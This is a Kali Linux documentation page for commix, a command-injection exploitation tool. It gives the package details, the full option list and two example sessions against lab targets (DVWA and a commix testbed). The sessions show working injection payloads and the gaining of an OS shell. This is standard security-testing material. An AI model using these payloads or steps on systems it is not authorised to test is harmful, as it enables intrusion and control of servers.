---
Title: commix
Homepage: https://commixproject.com
Repository: https://gitlab.com/kalilinux/packages/commix
Architectures: all
Version: 3.8-0kali1
Metapackages: kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-web 
Icon: images/commix-logo.svg
PackagesInfo: |
 ### commix
 
  This package contains Commix (short for [comm]and [i]njection e[x]ploiter).
  It has a simple environment and it can be used, from web developers,
  penetration testers or even security researchers to test web applications with
  the view to find bugs, errors or vulnerabilities related to command injection
  attacks. By using this tool, it is very easy to find and exploit a command
  injection vulnerability in a certain vulnerable parameter or string.
  Commix is written in Python programming language.
 
 **Installed size:** `1.20 MB`  
 **How to install:** `sudo apt install commix`  
 
 {{< spoiler "Dependencies:" >}}
 * metasploit-framework
 * python3
 * unicorn-magic 
 {{< /spoiler >}}
 
 ##### commix
 
 
 ```
 root@kali:~# commix -h
 Usage: commix [option(s)]
 
 Options:
   -h, --help            Show help and exit.
 
   General:
     These options relate to general matters.
 
     -v VERBOSE          Verbosity level (0-4, Default: 0).
     --version           Show version number and exit.
     --output-dir=OUT..  Set custom output directory path.
     -s SESSION_FILE     Load session from a stored (.sqlite) file.
     --flush-session     Flush session files for current target.
     --ignore-session    Ignore results stored in session file.
     -t TRAFFIC_FILE     Log all HTTP traffic into a textual file.
     --batch             Never ask for user input, use the default behaviour.
     --skip-heuristics   Skip heuristic detection for code injection.
     --codec=CODEC       Force codec for character encoding (e.g. 'ascii').
     --charset=CHARSET   Time-related injection charset (e.g.
                         "0123456789abcdef")
     --check-internet    Check internet connection before assessing the target.
     --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
 
   Target:
     This options has to be provided, to define the target URL.
 
     -u URL, --url=URL   Target URL.
     --url-reload        Reload target URL after command execution.
     -l LOGFILE          Parse target from HTTP proxy log file.
     -m BULKFILE         Scan multiple targets given in a textual file.
     -r REQUESTFILE      Load HTTP request from a file.
     --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
                         (Default: 1).
     --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout").
     -x SITEMAP_URL      Parse target(s) from remote sitemap(.xml) file.
     --method=METHOD     Force usage of given HTTP method (e.g. PUT)
 
   Request:
     These options can be used to specify how to connect to the target URL.
 
     -d DATA, --data=..  Data string to be sent through POST.
     --host=HOST         HTTP Host header.
     --referer=REFERER   HTTP Referer header.
     --user-agent=AGENT  HTTP User-Agent header.
     --random-agent      Use a randomly selected HTTP User-Agent header.
     --param-del=PDEL    Set character for splitting parameter values.
     --cookie=COOKIE     HTTP Cookie header.
     --cookie-del=CDEL   Set character for splitting cookie values.
     -H HEADER, --hea..  Extra header (e.g. 'X-Forwarded-For: 127.0.0.1').
     --headers=HEADERS   Extra headers (e.g. 'Accept-Language: fr\nETag: 123').
     --proxy=PROXY       Use a proxy to connect to the target URL.
     --tor               Use the Tor network.
     --tor-port=TOR_P..  Set Tor proxy port (Default: 8118).
     --tor-check         Check to see if Tor is used properly.
     --auth-url=AUTH_..  Login panel URL.
     --auth-data=AUTH..  Login parameters and data.
     --auth-type=AUTH..  HTTP authentication type (Basic, Digest, Bearer).
     --auth-cred=AUTH..  HTTP authentication credentials (e.g. 'admin:admin').
     --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401).
     --force-ssl         Force usage of SSL/HTTPS.
     --ignore-redirects  Ignore redirection attempts.
     --timeout=TIMEOUT   Seconds to wait before timeout connection (Default:
                         30).
     --retries=RETRIES   Retries when the connection timeouts (Default: 3).
     --drop-set-cookie   Ignore Set-Cookie header from response.
 
   Enumeration:
     These options can be used to enumerate the target host.
 
     --all               Retrieve everything.
     --current-user      Retrieve current user name.
     --hostname          Retrieve current hostname.
     --is-root           Check if the current user have root privileges.
     --is-admin          Check if the current user have admin privileges.
     --sys-info          Retrieve system information.
     --users             Retrieve system users.
     --passwords         Retrieve system users password hashes.
     --privileges        Retrieve system users privileges.
     --ps-version        Retrieve PowerShell's version number.
 
   File access:
     These options can be used to access files on the target host.
 
     --file-read=FILE..  Read a file from the target host.
     --file-write=FIL..  Write to a file on the target host.
     --file-upload=FI..  Upload a file on the target host.
     --file-dest=FILE..  Host's absolute filepath to write and/or upload to.
 
   Modules:
     These options can be used increase the detection and/or injection
     capabilities.
 
     --shellshock        The 'shellshock' injection module.
 
   Injection:
     These options can be used to specify which parameters to inject and to
     provide custom injection payloads.
 
     -p TEST_PARAMETER   Testable parameter(s).
     --skip=SKIP_PARA..  Skip testing for given parameter(s).
     --suffix=SUFFIX     Injection payload suffix string.
     --prefix=PREFIX     Injection payload prefix string.
     --technique=TECH    Specify injection technique(s) to use.
     --skip-technique..  Specify injection technique(s) to skip.
     --maxlen=MAXLEN     Set the max length of output for time-related
                         injection techniques (Default: 10000 chars).
     --delay=DELAY       Seconds to delay between each HTTP request.
     --time-sec=TIMESEC  Seconds to delay the OS response (Default: 1).
     --tmp-path=TMP_P..  Set the absolute path of web server's temp directory.
     --web-root=WEB_R..  Set the web server document root directory (e.g.
                         '/var/www').
     --alter-shell=AL..  Use an alternative os-shell (e.g. 'Python').
     --os-cmd=OS_CMD     Execute a single operating system command.
     --os=OS             Force back-end operating system (e.g. 'Windows' or
                         'Unix').
     --tamper=TAMPER     Use given script(s) for tampering injection data.
     --msf-path=MSF_P..  Set a local path where metasploit is installed.
 
   Detection:
     These options can be used to customize the detection phase.
 
     --level=LEVEL       Level of tests to perform (1-3, Default: 1).
     --skip-calc         Skip the mathematic calculation during the detection
                         phase.
     --skip-empty        Skip testing the parameter(s) with empty value(s).
     --failed-tries=F..  Set a number of failed injection tries, in file-based
                         technique.
 
   Miscellaneous:
     --ignore-depende..  Ignore all required third-party library dependencies.
     --list-tampers      Display list of available tamper scripts.
     --alert=ALERT       Run host OS command(s) when injection point is found.
     --no-logging        Disable logging to a file.
     --purge             Safely remove all content from commix data directory.
     --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection.
     --mobile            Imitate smartphone through HTTP User-Agent header.
     --offline           Work in offline mode.
     --wizard            Simple wizard interface for beginner users.
     --disable-coloring  Disable console output coloring.
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## Commix Usage Example

```
root@kali:~# commix --url http://192.168.20.12/dvwa/vulnerabilities/exec/ \
>   --cookie='PHPSESSID=cj645co26lgve7ro1kc9dvt3a0; security=low' \
>   --data='ip=INJECT_HERE&Submit=Submit'
                                       __
   ___    ___     ___ ___     ___ ___ /\_\   __  _
  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ { v0.3b-nongit-20160104 }

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2015 Anastasios Stasinopoulos (@ancst)
+--

(*) Checking connection to the target URL... [ SUCCEED ]
(^) Warning: Heuristics have failed to identify server's operating system.
(?) Do you recognise the server's operating system? [(W)indows/(U)nix/(q)uit] > w
(*) Setting the (POST) 'ip' parameter for tests.
(^) Warning: Due to the relatively slow response of 'cmd.exe' there may be delays during the data extraction procedure.
(*) Testing the classic injection technique... [ SUCCEED ]
(!) The (POST) 'ip' parameter is vulnerable to Results-based Command Injection.
  (+) Type : Results-based Command Injection
  (+) Technique : Classic Injection Technique
  (+) Payload : %26 for /f "delims=" %i in ('cmd /c "set /a (49+1)"') do @set /p = AWMZVA%iAWMZVAAWMZVA <nul

(?) Do you want a Pseudo-Terminal shell? [Y/n/q] > y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > whoami

nt authority\iusr

commix(os_shell) >
```

Attempt to exploit a site (`–url=”http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php”`) using the highest testing level (`–level=3`):

```
root@kali:~# commix --url="http://192.168.0.23/commix-testbed/scenarios/referer/referer(classic).php" --level=3
                                       __
   ___    ___     ___ ___     ___ ___ /\_\   __  _
  /'___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v1.7-stable
 /\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </
 \ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ http://commixproject.com
  \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)

+--
Automated All-in-One OS Command Injection and Exploitation Tool
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst)
+--

[*] Checking connection to the target URL... [ SUCCEED ]
[*] Setting the HTTP header User-Agent for tests.
[*] Testing the (results-based) classic command injection technique... [ FAILED ]
[*] Testing the (results-based) dynamic code evaluation technique... [ FAILED ]
[*] Testing the (blind) time-based command injection technique... [ FAILED ]
[*] Trying to create a file in '/var/www/html/commix-testbed/scenarios/referer/'...
[!] Warning: It seems that you don't have permissions to read and/or write files in '/var/www/html/commix-testbed/scenarios/referer/'.
[?] Do you want to try the temporary directory (/tmp/) [Y/n] > Y
[*] Trying to create a file, in temporary directory (/tmp/)...
[*] Testing the (semi-blind) tempfile-based injection technique... [ FAILED ]
[!] Warning: The tested HTTP header User-Agent seems to be not injectable.
[*] Setting the HTTP header Referer for tests.
[*] Testing the (results-based) classic command injection technique... [ SUCCEED ]
[+] The HTTP header Referer seems injectable via (results-based) classic command injection technique.
    [~] Payload: ';echo KSXTLU$((18+64))$(echo KSXTLU)KSXTLU'

[?] Do you want a Pseudo-Terminal shell? [Y/n] > Y

Pseudo-Terminal (type '?' for available options)
commix(os_shell) > ?

  ---[ Available options ]---
  Type '?' to get all the available options.
  Type 'back' to move back from the current context.
  Type 'quit' (or use <Ctrl-C>) to quit commix.
  Type 'reverse_tcp' to get a reverse TCP connection.
  Type 'bind_tcp' to set a bind TCP connection.

commix(os_shell) > id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

commix(os_shell) > ls

index.html referer(blind).php referer(classic).php referer(eval).php

commix(os_shell) > quit

root@kali:~#
```

## Video

<script type="text/javascript" src="https://asciinema.org/a/105988.js" id="asciicast-105988" async></script>
